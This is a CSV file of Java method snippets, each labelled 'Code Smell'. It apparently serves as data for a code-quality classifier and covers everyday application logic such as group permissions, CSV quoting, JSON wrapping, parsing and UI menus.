text,label,text_label
"@Override public ErrorCode setGroupManager(String operator,String groupId,int type,List<String> userList,boolean isAdmin){
  HazelcastInstance hzInstance=m_Server.getHazelcastInstance();
  IMap<String,WFCMessage.GroupInfo> mIMap=hzInstance.getMap(GROUPS_MAP);
  WFCMessage.GroupInfo groupInfo=mIMap.get(groupId);
  if (groupInfo == null) {
    return ErrorCode.ERROR_CODE_NOT_EXIST;
  }
  if (!isAdmin && (groupInfo.getType() == ProtoConstants.GroupType.GroupType_Restricted || groupInfo.getType() == ProtoConstants.GroupType.GroupType_Normal) && (groupInfo.getOwner() == null || !groupInfo.getOwner().equals(operator))) {
    return ErrorCode.ERROR_CODE_NOT_RIGHT;
  }
  if (userList.contains(groupInfo.getOwner())) {
    return ErrorCode.ERROR_CODE_NOT_RIGHT;
  }
  long updateDt=System.currentTimeMillis();
  MultiMap<String,WFCMessage.GroupMember> groupMembers=hzInstance.getMultiMap(GROUP_MEMBERS);
  Collection<WFCMessage.GroupMember> members=groupMembers.get(groupId);
  if (members == null || members.size() == 0) {
    members=loadGroupMemberFromDB(hzInstance,groupId);
  }
  for (  WFCMessage.GroupMember member : members) {
    if (userList.contains(member.getMemberId())) {
      groupMembers.remove(groupId,member);
      member=member.toBuilder().setType(type == 0 ? ProtoConstants.GroupMemberType.GroupMemberType_Normal : ProtoConstants.GroupMemberType.GroupMemberType_Manager).setUpdateDt(updateDt).build();
      databaseStore.persistGroupMember(groupId,Arrays.asList(member),false);
      groupMembers.put(groupId,member);
    }
  }
  databaseStore.persistGroupInfo(groupInfo.toBuilder().setUpdateDt(updateDt).setMemberUpdateDt(updateDt).build());
  mIMap.evict(groupId);
  callbackGroupMemberEvent(operator,groupId,userList,ProtoConstants.GroupMemberUpdateEventType.Group_Member_Event_Type_Update,(type == 0 ? ProtoConstants.GroupMemberType.GroupMemberType_Normal : ProtoConstants.GroupMemberType.GroupMemberType_Manager) + """");
  return ErrorCode.ERROR_CODE_SUCCESS;
}",1,Code Smell
"private String emit(String v){
  if (v.contains(delimiter) || v.contains("" "") || v.contains(""\n"")|| v.contains(""\r"")|| v.contains(""\"""")) {
    return ""\"""" + v.replaceAll(""\"""",""\""\"""") + ""\"""";
  }
 else {
    return v;
  }
}
private String emit(int i){
  return emit(String.format(""%d"",i));
}
private String emit(long l){
  return emit(String.format(""%d"",l));
}
private String emit(double d){
  return emit(String.format(""%f"",d));
}
",1,Code Smell
"@Override @Transactional(rollbackFor=Exception.class) public void transferPermission(CrmPermissionTransferReqBO transferReqBO){
  CrmPermissionDO oldPermission=permissionMapper.selectByBizTypeAndBizIdByUserId(transferReqBO.getBizType(),transferReqBO.getBizId(),transferReqBO.getUserId());
  String bizTypeName=CrmBizTypeEnum.getNameByType(transferReqBO.getBizType());
  if (oldPermission == null || (!isOwner(oldPermission.getLevel()) && !CrmPermissionUtils.isCrmAdmin())) {
    throw exception(CRM_PERMISSION_DENIED,bizTypeName);
  }
  if (ObjUtil.equal(transferReqBO.getNewOwnerUserId(),oldPermission.getUserId())) {
    throw exception(CRM_PERMISSION_MODEL_TRANSFER_FAIL_OWNER_USER_EXISTS,bizTypeName);
  }
  adminUserApi.validateUserList(Collections.singletonList(transferReqBO.getNewOwnerUserId()));
  List<CrmPermissionDO> permissions=permissionMapper.selectByBizTypeAndBizId(transferReqBO.getBizType(),transferReqBO.getBizId());
  CrmPermissionDO permission=CollUtil.findOne(permissions,item -> ObjUtil.equal(item.getUserId(),transferReqBO.getNewOwnerUserId()));
  if (permission == null) {
    permissionMapper.insert(new CrmPermissionDO().setBizType(transferReqBO.getBizType()).setBizId(transferReqBO.getBizId()).setUserId(transferReqBO.getNewOwnerUserId()).setLevel(CrmPermissionLevelEnum.OWNER.getLevel()));
  }
 else {
    permissionMapper.updateById(new CrmPermissionDO().setId(permission.getId()).setLevel(CrmPermissionLevelEnum.OWNER.getLevel()));
  }
  if (transferReqBO.getOldOwnerPermissionLevel() != null) {
    permissionMapper.updateById(new CrmPermissionDO().setId(oldPermission.getId()).setLevel(transferReqBO.getOldOwnerPermissionLevel()));
  }
 else {
    permissionMapper.deleteById(oldPermission.getId());
  }
}
",1,Code Smell
"/** 
 * Wraps the given object if necessary. <p> If the object is null or , returns  {@link #NULL}. If the object is a {@code JSONArray} or {@code JSONObject}, no wrapping is necessary. If the object is {@code NULL}, no wrapping is necessary. If the object is an array or {@code Collection}, returns an equivalent  {@code JSONArray}. If the object is a {@code Map}, returns an equivalent  {@code JSONObject}. If the object is a primitive wrapper type or  {@code String}, returns the object. Otherwise if the object is from a  {@code java} package, returns the result of {@code toString}. If wrapping fails, returns null.
 * @param o the object to wrap
 * @return the wrapped object
 */
@SuppressWarnings(""rawtypes"") public static Object wrap(Object o){
  if (o == null) {
    return NULL;
  }
  if (o instanceof JSONArray || o instanceof JSONObject) {
    return o;
  }
  if (o.equals(NULL)) {
    return o;
  }
  try {
    if (o instanceof Collection) {
      return new JSONArray((Collection)o);
    }
 else     if (o.getClass().isArray()) {
      return new JSONArray(o);
    }
    if (o instanceof Map) {
      return new JSONObject((Map)o);
    }
    if (o instanceof Boolean || o instanceof Byte || o instanceof Character|| o instanceof Double|| o instanceof Float|| o instanceof Integer|| o instanceof Long|| o instanceof Short|| o instanceof String) {
      return o;
    }
    if (o.getClass().getPackage().getName().startsWith(""java."")) {
      return o.toString();
    }
  }
 catch (  Exception ignored) {
  }
  return null;
}
",1,Code Smell
"public void setDevices(List<Device> devices){
  for (  Device device : devices) {
    MenuItem deviceItem=new MenuItem(device.getModel().toDisplayString());
    if (!device.isNeedsPinSent() && (device.getModel() == WalletModel.TREZOR_1 || device.getModel() == WalletModel.TREZOR_T || device.getModel() == WalletModel.TREZOR_SAFE_3 || device.getModel() == WalletModel.KEEPKEY || device.getModel() == WalletModel.BITBOX_02)) {
      deviceItem=new Menu(device.getModel().toDisplayString());
      MenuItem toggleItem=new MenuItem(""Toggle Passphrase"" + (!device.getModel().externalPassphraseEntry() ? """" : (device.isNeedsPassphraseSent() ? "" Off"" : "" On"")));
      toggleItem.setOnAction(event -> {
        Hwi.TogglePassphraseService togglePassphraseService=new Hwi.TogglePassphraseService(device);
        togglePassphraseService.setOnSucceeded(event1 -> {
          EventManager.get().post(new RequestOpenWalletsEvent());
          if (!device.getModel().externalPassphraseEntry()) {
            AppServices.showAlertDialog(""Reconnect device"",""Reconnect your "" + device.getModel().toDisplayString() + "" to reset the passphrase."",Alert.AlertType.INFORMATION);
          }
        }
);
        togglePassphraseService.setOnFailed(event1 -> {
          AppServices.showErrorDialog(""Error toggling passphrase"",event1.getSource().getException().getMessage());
        }
);
        togglePassphraseService.start();
      }
);
      ((Menu)deviceItem).getItems().add(toggleItem);
    }
    if (device.isNeedsPinSent()) {
      deviceItem.setGraphic(getLockIcon());
    }
 else {
      deviceItem.setGraphic(getLockOpenIcon());
    }
    getItems().add(deviceItem);
  }
}",1,Code Smell
"/** 
 * Parses a hex color in   {@code #RGB},  {@code #RGBA},  {@code #RRGGBB} or {@code #RRGGBBAA}format and returns it as  {@code rgba} integer suitable for {@link java.awt.Color}, which includes alpha component in bits 24-31.
 */
static int parseColorRGBA(String value) throws IllegalArgumentException {
  int len=value.length();
  if ((len != 4 && len != 5 && len != 7 && len != 9) || value.charAt(0) != '#')   throw newInvalidColorException(value);
  int n=0;
  for (int i=1; i < len; i++) {
    char ch=value.charAt(i);
    int digit;
    if (ch >= '0' && ch <= '9')     digit=ch - '0';
 else     if (ch >= 'a' && ch <= 'f')     digit=ch - 'a' + 10;
 else     if (ch >= 'A' && ch <= 'F')     digit=ch - 'A' + 10;
 else     throw newInvalidColorException(value);
    n=(n << 4) | digit;
  }
  if (len <= 5) {
    int n1=n & 0xf000;
    int n2=n & 0xf00;
    int n3=n & 0xf0;
    int n4=n & 0xf;
    n=(n1 << 16) | (n1 << 12) | (n2 << 12)| (n2 << 8)| (n3 << 8)| (n3 << 4)| (n4 << 4)| n4;
  }
  return (len == 4 || len == 7) ? (0xff000000 | n) : (((n >> 8) & 0xffffff) | ((n & 0xff) << 24));
}",1,Code Smell
"@SuppressWarnings(""unchecked"") @Override public boolean equals(Object obj){
  if (obj == null) {
    return false;
  }
 else   if (clazz == null || !clazz.isAssignableFrom(obj.getClass())) {
    return false;
  }
 else   if (obj == this) {
    return true;
  }
 else   if (this.name == null) {
    return ((AzureExpandableStringEnum<T>)obj).name == null;
  }
 else {
    return this.name.equals(((AzureExpandableStringEnum<T>)obj).name);
  }
}
",1,Code Smell
"public void checkAuthlibInjector(){
  SettingJson.Account account=UserManager.getSelectedAccount(mSetting);
  File file=new File(AppManifest.AUTHLIB_INJETOR_JAR);
  if (!file.exists() && account != null && account.type.equals(SettingJson.USER_TYPE_EXTERNAL)) {
    mTipperManager.addTip(TipperManager.createTipBean(mContext,TipperManager.TIPPER_LEVEL_ERROR,mContext.getString(R.string.title_missing_authlib),() -> DialogUtils.createBothChoicesDialog(mContext,mContext.getString(R.string.title_error),mContext.getString(R.string.tips_please_download_authlib_injector),mContext.getString(R.string.title_ok),mContext.getString(R.string.title_cancel),new DialogSupports(){
      @Override public void runWhenPositive(){
        new Request(mContext).requestLastestVersion();
      }
    }
),CHECKER_ID_MISSING_AUTHLIB));
  }
 else {
    mTipperManager.removeTip(CHECKER_ID_MISSING_AUTHLIB);
  }
}
",1,Code Smell
"private void openEventHandler(){
  try {
    int waitTimes=DEFAULT_WAIT_TIMES;
    for (; ; ) {
      if (shutdown || hasSubscriber() || waitTimes <= 0) {
        break;
      }
      try {
        Thread.sleep(SLEEP_1S);
      }
 catch (      InterruptedException e) {
        Thread.currentThread().interrupt();
      }
      waitTimes--;
    }
    for (; ; ) {
      if (shutdown) {
        break;
      }
      final AbstractEvent event=queue.take();
      receiveEvent(event);
      UPDATER.compareAndSet(this,lastEventSequence,Math.max(lastEventSequence,event.sequence()));
    }
  }
 catch (  Throwable ex) {
    log.error(""Event listener exception."",ex);
  }
}",1,Code Smell
"@Nullable private TreeVisitor<Xml,ExecutionContext> upgradeManagedDependency(Xml.Tag tag,ExecutionContext ctx,Xml.Tag t) throws MavenDownloadingException {
  ResolvedManagedDependency managedDependency=findManagedDependency(t);
  if (managedDependency != null) {
    String groupId=managedDependency.getGroupId();
    String artifactId=managedDependency.getArtifactId();
    String version=managedDependency.getVersion();
    if (version != null && !projectArtifacts.contains(new GroupArtifact(groupId,artifactId)) && matchesGlob(groupId,UpgradeDependencyVersion.this.groupId) && matchesGlob(artifactId,UpgradeDependencyVersion.this.artifactId)) {
      return upgradeVersion(ctx,t,managedDependency.getRequested().getVersion(),groupId,artifactId,version);
    }
  }
 else {
    for (    ResolvedManagedDependency dm : getResolutionResult().getPom().getDependencyManagement()) {
      if (dm.getBomGav() != null) {
        String group=getResolutionResult().getPom().getValue(tag.getChildValue(""groupId"").orElse(getResolutionResult().getPom().getGroupId()));
        String artifactId=getResolutionResult().getPom().getValue(tag.getChildValue(""artifactId"").orElse(""""));
        if (!projectArtifacts.contains(new GroupArtifact(group,artifactId))) {
          ResolvedGroupArtifactVersion bom=dm.getBomGav();
          if (Objects.equals(group,bom.getGroupId()) && Objects.equals(artifactId,bom.getArtifactId())) {
            return upgradeVersion(ctx,t,requireNonNull(dm.getRequestedBom()).getVersion(),bom.getGroupId(),bom.getArtifactId(),bom.getVersion());
          }
        }
      }
    }
  }
  return null;
}
",1,Code Smell
"@Transactional(propagation=Propagation.REQUIRES_NEW) public void updateUserCounterWrong(String name,int i){
  List<UserEntity> userList=userRepository.findByName(name);
  if (userList.size() > 0) {
    log.info(""updateUserCounterWrong {} +{}"",name,i);
    if (true) {
      lock.lock();
      userList=userRepository.findByName(name);
      UserEntity user=userList.get(0);
      try {
        Thread.sleep(1000);
        user.setCounter(user.getCounter() + i);
        userRepository.save(user);
      }
 catch (      InterruptedException ignore) {
      }
 finally {
        lock.unlock();
      }
    }
  }
 else {
    userRepository.save(new UserEntity(name,""""));
  }
}",1,Code Smell
"private void expression() throws Exception {
  relationalExpression();
  String currentReturnType=expressionReturnType;
  while (lexer.PeekNextToken().Token.equals(""&"") || lexer.PeekNextToken().Token.equals(""|"")) {
    String relationSymbol=lexer.PeekNextToken().Token;
    lexer.GetNextToken();
    relationalExpression();
    if (!((currentReturnType.equals(""boolean"") && expressionReturnType.equals(""boolean"")) || (currentReturnType.equals(""int"") && expressionReturnType.equals(""int"")))) {
      error(""Error: in class: "" + className + "", two ends of relational expression are not all int, line: ""+ lexer.PeekNextToken().LineNumber);
    }
    if (relationSymbol.equals(""&"")) {
      vmCodeInput(""and\n"");
    }
 else {
      vmCodeInput(""or\n"");
    }
    expressionReturnType=""boolean"";
  }
}
",1,Code Smell
"@Override public void onMentionCharacterInput(String tag){
  if ((tag.equals(TIMMentionEditText.TIM_MENTION_TAG) || tag.equals(TIMMentionEditText.TIM_MENTION_TAG_FULL)) && TUIChatUtils.isGroupChat(mChatLayout.getChatInfo().getType())) {
    if (mOnInputViewListener != null) {
      mOnInputViewListener.onStartGroupMemberSelectActivity();
    }
  }
}
",1,Code Smell
